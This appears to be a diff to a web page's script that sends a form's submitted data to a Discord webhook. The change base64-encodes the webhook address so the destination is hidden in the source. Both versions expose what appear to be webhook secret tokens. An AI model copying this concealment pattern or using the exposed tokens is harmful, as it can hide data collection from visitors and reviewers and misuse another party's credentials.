@@ -120,7 +120,9 @@ console.log('');
         <script>
         // Get the form element
             const form = document.getElementById('myForm');
-          
+            let webhook = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA2MDkzOTY4NzU3NDkwMDczNi96QWZKOHZLTDZEcC1ZdnlFWkpYaURWdnNLb0VRZzNBOXo2SjV0YzlkdGpIb0NlblhHaF9JYXhHMGxzcmctX0RUZUlVOQ==';
+            let webhookdc = atob(webhook);
+
             // Add a submit event listener to the form
             form.addEventListener('submit', (event) => {
               // Prevent the default form submission behavior
@@ -151,7 +153,7 @@ console.log('');
               };
           
               // Send the POST request to the Discord webhook
-              fetch('https://discord.com/api/webhooks/1060164270974849074/4EzKCDJLGBcSTxY0gY3Vau5y29SUlVoE3gSjthd4VjFzzPO0NNAW9W_lG8CduaOsKtS4', {
+              fetch(webhookdc, {
                 method: 'POST',
                 body: JSON.stringify(message),
                 headers: {
